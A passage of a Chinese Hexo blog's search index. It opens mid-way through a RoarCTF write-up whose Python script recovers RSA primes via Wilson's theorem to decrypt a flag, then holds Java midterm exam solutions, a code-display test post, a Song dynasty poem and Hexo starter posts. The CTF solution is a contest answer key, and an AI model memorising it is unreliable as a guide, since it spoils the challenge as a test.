punctuation">(</span>A1<span class="token punctuation">,</span>B1<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>x2<span class="token operator">=</span>getmod<span class="token punctuation">(</span>A2<span class="token punctuation">,</span>B2<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>y1<span class="token operator">=</span>invert<span class="token punctuation">(</span>x1<span class="token punctuation">,</span>A1<span class="token punctuation">)</span>y2<span class="token operator">=</span>invert<span class="token punctuation">(</span>x2<span class="token punctuation">,</span>A2<span class="token punctuation">)</span>p <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>y1<span class="token punctuation">)</span>q <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>y2<span class="token punctuation">)</span>r <span class="token operator">=</span> n<span class="token operator">/</span>q<span class="token operator">/</span>pphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>r<span class="token number">-1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m <span class="token operator">=</span> pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span></code></pre><p>这里面用了sympy这个库，sympy.get prime(),括号内代表获取第多少个素数，sympy.nextprime(),括号内表示获得这个素数后的下一个素数。</p><p>解释下解密脚本</p><p>由威尔逊定理我们可以得知</p><pre><code>（A1-1）！mod A1=-1 mod A1</code></pre><p>进一步推导可以得到</p><pre><code>（A1-2）！mod A1=1 mod A1</code></pre><p>推导过程如下：</p><p>(A1-2)!=(A1-1)!/A1-1</p><p>设(A1-1)!为P,则原式可化为:</p><pre><code>(P* 1/A1-1) mod A1</code></pre><pre><code>(P* 1/(A1-1)) mod A1=((P mod A1) *(1/(A1-1) mod A1) mod A1)</code></pre><p>由于P mod A1=-1，原式可化为</p><pre><code>（-1*（1/（A1-1）mod A1）mod A1）</code></pre><p>对与分数的模，可以化为</p><p>((A1-1) <sup>-1</sup>mod A1 * -1)mod A1</p><p>求负一次方的模就相当于求模逆，所以</p><p>(A1-1)<sup>-1</sup>mod A1=-1</p><p>原式等于</p><pre><code>（-1*-1) mod A1=1</code></pre><p>所以，我们令H=(B+1)*(B+2)*(B+3)……*(A-2)</p><p>由于：</p><p>1*2*3*4……*B*(B+1)*(B+2)*(B+3)……*(A-2) mod A1=1</p><p>回想rsa中求d,我们就可以知道如何求得B！</p><pre><code>B!=invert(H,A1)</code></pre><hr><p>求得B!阶乘，我们很快就得到了p,q,r，下面就是求rsad的正常操作了。</p><p>运行代码得到flag</p><img src="/2019/10/20/roarctf-bu-fen-wp/10.PNG">]]></content>
      
      
      
        <tags>
            
            <tag> -ctf -wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java期中测试</title>
      <link href="/2019/10/19/javaa-qi-zhong-ce-shi/"/>
      <url>/2019/10/19/javaa-qi-zhong-ce-shi/</url>
      
        <content type="html"><![CDATA[<h4 id="Java程序设计期中考试"><a href="#Java程序设计期中考试" class="headerlink" title="Java程序设计期中考试"></a>Java程序设计期中考试</h4><ol><li>计算n!=1<em>2</em>3…*n.(20分)</li><li>输入10个整数，然后逆序输出这个10个整数。(20分)</li><li>计算S=1-1/(2^2)+1/(3^3)-1/(4^4)+…+(-1)^(n-1)/(n^n) (20分)</li><li>设计一个复数类Complex,用来实现加减运算，并在屏幕上输出当前复数。(30分)</li></ol><h5 id="第一题："><a href="#第一题：" class="headerlink" title="第一题："></a>第一题：</h5><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Scanner<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">test1</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span>args<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> ss<span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"请输入一个数:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Scanner console<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>        ss<span class="token operator">=</span>console<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> s<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>ss<span class="token punctuation">;</span>i<span class="token operator">>=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            s<span class="token operator">=</span>s<span class="token operator">*</span>i<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>运行截图：</p><img src="/2019/10/19/javaa-qi-zhong-ce-shi/1.png" title="第一题"><h5 id="第二题："><a href="#第二题：" class="headerlink" title="第二题："></a>第二题：</h5><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Scanner<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span>args<span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"请输入10个数，以空格隔开:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Scanner sc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>        String str <span class="token operator">=</span> sc<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String<span class="token punctuation">[</span><span class="token punctuation">]</span> arr  <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span>b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span>b<span class="token punctuation">.</span>length<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>         <span class="token punctuation">{</span>                b<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> Integer<span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span> n<span class="token operator">=</span>b<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> b<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">int</span> t<span class="token operator">=</span>b<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                    b<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>b<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    b<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>t<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token operator">=</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>k<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>运行截图：</p><img src="/2019/10/19/javaa-qi-zhong-ce-shi/2.png" title="第二题"><h5 id="第三题"><a href="#第三题" class="headerlink" title="第三题:"></a>第三题:</h5><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Scanner<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span>args<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> n<span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"请输入一个数:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Scanner console<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>        n<span class="token operator">=</span>console<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">double</span> s<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">double</span> a<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                a<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">pow</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span><span class="token punctuation">{</span>                a<span class="token operator">=</span><span class="token number">1</span><span class="token operator">/</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">pow</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            s<span class="token operator">=</span>s<span class="token operator">+</span>a<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>运行截图：</p><img src="/2019/10/19/javaa-qi-zhong-ce-shi/3.png" title="第三题"><h5 id="第四题："><a href="#第四题：" class="headerlink" title="第四题："></a>第四题：</h5><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Scanner<span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Complex</span> <span class="token punctuation">{</span>     <span class="token keyword">double</span> real<span class="token punctuation">;</span>      <span class="token keyword">double</span> image<span class="token punctuation">;</span>    <span class="token function">Complex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          Scanner input <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">double</span> real <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">nextDouble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">double</span> image <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">nextDouble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">Complex</span><span class="token punctuation">(</span>real<span class="token punctuation">,</span>image<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">Complex</span><span class="token punctuation">(</span><span class="token keyword">double</span> real<span class="token punctuation">,</span> <span class="token keyword">double</span> image<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 供不带参数的构造方法调用  </span>        <span class="token comment" spellcheck="true">// TODO Auto-generated method stub  </span>        <span class="token keyword">this</span><span class="token punctuation">.</span>real <span class="token operator">=</span> real<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>image <span class="token operator">=</span> image<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token function">Complex</span><span class="token punctuation">(</span><span class="token keyword">double</span> real<span class="token punctuation">,</span><span class="token keyword">double</span> image<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>real <span class="token operator">=</span> real<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>image <span class="token operator">=</span> image<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">getReal</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">return</span> real<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setReal</span><span class="token punctuation">(</span><span class="token keyword">double</span> real<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>real <span class="token operator">=</span> real<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">getImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">return</span> image<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setImage</span><span class="token punctuation">(</span><span class="token keyword">double</span> image<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>image <span class="token operator">=</span> image<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      Complex <span class="token function">add</span><span class="token punctuation">(</span>Complex a<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 相加  </span>        <span class="token keyword">double</span> real2 <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">getReal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">double</span> image2 <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">getImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">double</span> newReal <span class="token operator">=</span> real <span class="token operator">+</span> real2<span class="token punctuation">;</span>          <span class="token keyword">double</span> newImage <span class="token operator">=</span> image <span class="token operator">+</span> image2<span class="token punctuation">;</span>          Complex result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Complex</span><span class="token punctuation">(</span>newReal<span class="token punctuation">,</span>newImage<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> result<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      Complex <span class="token function">sub</span><span class="token punctuation">(</span>Complex a<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 相减  </span>        <span class="token keyword">double</span> real2 <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">getReal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">double</span> image2 <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">getImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">double</span> newReal <span class="token operator">=</span> real <span class="token operator">-</span> real2<span class="token punctuation">;</span>          <span class="token keyword">double</span> newImage <span class="token operator">=</span> image <span class="token operator">-</span> image2<span class="token punctuation">;</span>          Complex result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Complex</span><span class="token punctuation">(</span>newReal<span class="token punctuation">,</span>newImage<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> result<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 输出  </span>        <span class="token keyword">if</span><span class="token punctuation">(</span>image <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>              System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>real <span class="token operator">+</span> <span class="token string">" + "</span> <span class="token operator">+</span> image <span class="token operator">+</span> <span class="token string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>image <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>              System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>real <span class="token operator">+</span> <span class="token string">""</span> <span class="token operator">+</span> image <span class="token operator">+</span> <span class="token string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>              System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>real<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>      <span class="token punctuation">}</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>          System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"请用户输入第一个复数的实部和虚部:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          Complex data1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Complex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"请用户输入第二个复数的实部和虚部:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          Complex data2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Complex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          Complex result_add <span class="token operator">=</span> data1<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span><span class="token punctuation">;</span>          Complex result_sub <span class="token operator">=</span> data1<span class="token punctuation">.</span><span class="token function">sub</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span><span class="token punctuation">;</span>           result_add<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          result_sub<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  </code></pre><p>运行截图：</p><img src="/2019/10/19/javaa-qi-zhong-ce-shi/4.png" title="第四题">]]></content>
      
      
      
        <tags>
            
            <tag> -java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>test2</title>
      <link href="/2019/10/18/test2/"/>
      <url>/2019/10/18/test2/</url>
      
        <content type="html"><![CDATA[<img src="/2019/10/18/test2/2.PNG" title="This is an example image"><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hello hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><img src="/2019/10/18/test2/1.PNG" title="this is a example image"><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token string">"hello world"</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 图片测试 </tag>
            
            <tag> 代码测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《玉楼春》</title>
      <link href="/2019/04/06/yu-lou-chun/"/>
      <url>/2019/04/06/yu-lou-chun/</url>
      
        <content type="html"><![CDATA[<h1 id="玉楼春·春景"><a href="#玉楼春·春景" class="headerlink" title="玉楼春·春景"></a><center>玉楼春·春景</center></h1><p><center frontsize="14">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>北宋 &nbsp;宋祁</strong></center></p><p><center><h2><em>东城渐觉风光好，縠皱波纹迎客棹。</em></h2></center></p><p><center><h2><em>绿杨烟外晓寒轻，红杏枝头春意闹。</em></h2></center></p><p><center><h2><em>浮生长恨欢娱少，肯爱千金轻一笑。</em></h2></center></p><p><center><h2><em>为君持酒劝斜阳，且向花间留晚照。</em></h2><center><br><img src="https://img-blog.csdnimg.cn/20190407101849224.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1X2NzZG5zdG9yeQ==,size_16,color_FFFFFF,t_70" alt=""></center></center></p>]]></content>
      
      
      
        <tags>
            
            <tag> 文学 </tag>
            
            <tag> 宋词 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你好!hexo</title>
      <link href="/2018/09/20/ni-hao-hexo/"/>
      <url>/2018/09/20/ni-hao-hexo/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2018/09/19/hello-world/"/>
      <url>/2018/09/19/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
